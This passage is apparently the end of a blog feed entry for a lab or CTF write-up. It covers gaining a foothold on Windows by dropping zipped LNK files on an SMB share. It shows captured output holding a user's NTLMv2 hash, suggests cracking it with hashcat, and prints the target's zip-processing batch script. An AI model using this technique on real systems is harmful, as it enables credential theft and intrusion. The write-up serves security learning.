class=\"o\">[]</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Incoming connection <span class=\"o\">(</span>10.10.147.136,50224<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> AUTHENTICATE_MESSAGE <span class=\"o\">(</span>SET<span class=\"se\">\\M</span>ichelleWat,SET<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> User SET<span class=\"se\">\\M</span>ichelleWat authenticated successfully<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> MichelleWat::SET:aaaaaaaaaaaaaaaa:39d0e73f4909f98a02f8be457e765a0f:0101000000000000804060642685d701cefc2fd6b5e9dc17000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b0007000800804060642685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Closing down connection <span class=\"o\">(</span>10.10.147.136,50224<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Remaining connections <span class=\"o\">[]</span></code></pre></div></div><ul>  <li>You will be able to capture the NLMv2 hashes. You can now use hashcat to crack it.</li></ul><h2 id=\"other-info\">Other Info</h2><p>Here is the script that process the zip files inside smb share.</p><div class=\"language-batch highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>@echo <span class=\"na\">off</span><span class=\"kd\">SET</span> <span class=\"kd\">source</span><span class=\"o\">=</span><span class=\"s2\">\"C:\\Shares\\Files\"</span><span class=\"kd\">SET</span> <span class=\"kd\">extracted</span><span class=\"o\">=</span><span class=\"s2\">\"C:\\Shares\\extracted\"</span><span class=\"kd\">powershell</span><span class=\"err\">.exe</span> <span class=\"na\">-NoP -NonI -Command </span><span class=\"s2\">\"Expand-Archive '</span><span class=\"nv\">%source%</span><span class=\"s2\">\\*.zip' '</span><span class=\"nv\">%extracted%</span><span class=\"s2\">'\"</span><span class=\"kd\">FOR</span> <span class=\"na\">/f </span><span class=\"s2\">\"tokens=*\"</span> <span class=\"vm\">%%G</span> <span class=\"kd\">IN</span> <span class=\"o\">(</span><span class=\"s1\">'dir /s /b </span><span class=\"nv\">%extracted%</span><span class=\"s1\">\\..\\*.'</span><span class=\"o\">)</span> <span class=\"kd\">DO</span> <span class=\"o\">(</span><span class=\"kd\">explorer</span> <span class=\"vm\">%%G</span><span class=\"o\">)</span>\t<span class=\"nb\">ping</span> <span class=\"na\">-n </span><span class=\"m\">3</span> <span class=\"m\">127</span>.1&gt;NUL<span class=\"nb\">taskkill</span> <span class=\"na\">/IM </span><span class=\"kd\">explorer</span><span class=\"err\">.exe</span><span class=\"nb\">rmdir</span> <span class=\"nv\">%extracted%</span> <span class=\"na\">/q /s</span><span class=\"nb\">del</span> <span class=\"nv\">%source%</span>\\<span class=\"o\">*</span>.zip <span class=\"na\">-j</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html\">How Attackers are Using LNK Files to Download Malware</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/24/zipped-lnk-files-over-smb",
            
            
            
            "tags": ["windows","foothold","rce","smb"],
            
            "date_published": "2022-01-24T00:00:00+08:00",
            "date_modified": "2022-01-24T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}